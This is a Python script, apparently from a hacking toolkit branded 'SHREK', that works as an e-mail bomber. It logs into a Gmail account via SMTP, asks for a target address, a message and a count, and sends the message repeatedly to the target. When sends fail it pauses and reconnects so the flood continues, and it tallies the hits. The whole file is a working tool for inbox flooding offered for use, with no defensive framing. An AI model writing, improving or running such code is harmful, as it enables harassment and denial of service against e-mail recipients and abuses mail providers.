import os
import smtplib
import time


#CVALUE
blue= '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan  = "\033[96m"
end = '\033[0m'
line=green+"▬"*100
space=" "
logo=red+str("""        ███████╗██╗  ██╗██████╗ ███████╗██╗  ██╗    
        ██╔════╝██║  ██║██╔══██╗██╔════╝██║ ██╔╝ \33[93m   
        ███████╗███████║██████╔╝█████╗  █████╔╝     
        ╚════██║██╔══██║██╔══██╗██╔══╝  ██╔═██╗     
  \33[1;32m      ███████║██║  ██║██║  ██║███████╗██║  ██╗    
        ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    
                                                    """+end)


 #HEADER
text="\t\t\t"+blue+"☠ E-MAIL ☠ "+cyan+" ""\n\n\t\tDeveloped By:Shabbir Rahman\n" 
notice=""
def header():
        print(logo)
        print(text)
        print(line)
        print(notice)
#SELECT_MAIN
def opt():
        print(blue+"\n==> Select Your Option From Below")
        print(cyan+"\n\n [1] Start E-Mail Bombing\n\n [2] Back to Main menu")


#MAIN_TOOL
os.system('clear')
tt=1
header()
opt()
while tt<2:
        opt2=str(input(yellow+"\n\n [>] Enter the number of option : "+green))
        if opt2=="1":
                text=green+"\n\n\t\t★★★ SHREK E-Mail Bombing★★★   \n"
                notice=cyan+"\n\t\t[•] Connecting to the Server...."
                os.system('clear')
                header()
                try:
                        shrek=smtplib.SMTP('smtp.gmail.com','587')
                        shrek.ehlo()
                        shrek.starttls()
                        os.system('clear')
                        notice=green+"\n\t\t[✓] Server Connected   "
                        header()
                        mvalid=1
                        while mvalid<2:
                                email=str(input(yellow+"\n [>] Enter Your Own G-Mail : "+green))
                                pwd=str(input(yellow+"\n [>] Enter Your G-Mail Password : "+green))
                                os.system('clear')
                                text=green+"\n\n\t\t★★E-Mail Bombing★★   \n"
                                notice=cyan+"\n\t\t[•] Trying to Login...."
                                header()
                                try:
                                        shrek.login(email,pwd)
                                        os.system('clear')
                                        notice=green+"\n\t\t[✓] Login Successful!"
                                        header()
                                        start=1
                                        while start<2:
                                                tmail=str(input(yellow +"\n\n [>] Enter Your Target E-Mail : "+green))
                                                msg=str(input(yellow+"\n [>] Enter Your Message : "+green))
                                                try:
                                                        ammount=int(input(yellow+"\n [>] Enter The Ammount : "+green))
                                                except:
                                                        os.system('clear')
                                                        notice=red+"\n [×] Wrong ammount entered. Try Again! "
                                                        header()
                                                        continue
                                                os.system('clear')
                                                notice=cyan+"\n\t\t  [•] Tools in progress......\n\n"
                                                header()
                                                ammount2=1
                                                totalsent=0
                                                totalnotsent=0
                                                while ammount2<ammount+1:
                                                        try:
                                                                shrek.sendmail(email,tmail,msg)
                                                                if ammount2==1:
                                                                       print(green+"\n\t  ★★SHREK★★==>   "+green+"[✓] 1st E-Mail Sent.")
                                                                elif ammount2==2:
                                                                       print(green+"\n\t  ★★SHREK★★==>   "+green+"[✓] 2nd E-Mail Sent.")
                                                                elif ammount2==3:
                                                                       print(green+"\n\t  ★★SHREK★★==>   "+green+"[✓] 3rd E-Mail Sent.")
                                                                else:
                                                                       print(green+"\n\t  ★★SHREK★★==>   "+green+"[✓] "+str(ammount2)+"th E-Mail Sent.")
                                                                time.sleep(1)
                                                                totalsent+=1
                                                                ammount2+=1
                                                        except:
                                                                if ammount2==1:
                                                                       print(red+"\n\t  ★★SHREK★★==>   "+red+"[×] 1st E-Mail Not Sent.")
                                                                elif ammount2==2:
                                                                       print(red+"\n\t  ★★SHREK★★==>   "+red+"[×] 2nd E-Mail Not Sent.")
                                                                elif ammount2==3:
                                                                       print(red+"\n\t  ★★SHREK★★==>   "+red+"[×] 3rd E-Mail Not Sent.")
                                                                else:
                                                                       print(red+"\n\t  ★★SHREK★★==>   "+red+"[×] "+str(ammount2)+"th E-Mail Not Sent.")
                                                                try:
                                                                       print(red+"\n\t\t [•] Sleeping 30s. Wait...")
                                                                       time.sleep(30)
                                                                       shrek=smtplib.SMTP('smtp.gmail.com','587')
                                                                       shrek.ehlo()
                                                                       shrek.starttls()
                                                                       shrek.login(email,pwd)
                                                                       ammount2+=1
                                                                except:
                                                                       print(blue+"\n\t\t [•] Sleeping 30s. Wait...")
                                                                       time.sleep(30)
                                                                       ammount2+=1


                                                totalhit=ammount2-1
                                                totalnotsent=totalhit-totalsent
                                                print(cyan+"\n\n\t\t[•] Total Hits : "+yellow+str(totalhit))
                                                print(green+"\n\t\t[✓] Total Sent : "+yellow+str(totalsent))
                                                print(red+"\n\t\t[×] Total Not Sent : "+yellow+str(totalnotsent)+"\n")
                                                lastt=str(input(cyan+"\n\n\t\t\t[✓] All Done!\n\t [•] Now Press Enter for main menu\n"))
                                                
                                                os.system("clear")
                                                notice=""
                                                text=green+"\n\n\t\t★★★SHREK E-Mail Tools★★★   \n"
                                                header()
                                                opt()
                                                start=3
                                                mvalid=3

                                except:
                                        os.system('clear')
                                        notice=red+"\n [×] Wrong G-Mail or Password! Or \'\'Less Secure App\'\' is not enabled. "
                                        header()
                                        print(yellow+"\n  [1] Try Again ! \n\n  [2] Back To Main Tools")
                                        yti=str(input(yellow+"\n\n  [>] Select Your Option : "+yellow))
                                        if yti=="1":
                                                os.system('clear')
                                                notice=""
                                                header()
                                                mvalid=1
                                        else:
                                                os.system("clear")
                                                os.system("python3 main.py")
                except:
                        os.system('clear')
                        notice=red+"\n\t   [×]Check Your Internet Connection"
                        header()
                        opt()
                        continue


        elif opt2=="2":
                os.system("python3 main.py")
        else:
                text=green+"\n\n\t\t★★★ROC-X E-Mail Tools★★★   \n"
                notice=red+"\n\t\t[×] Wrong Value Entered"
                os.system('clear')
                header()
                opt()
                continue
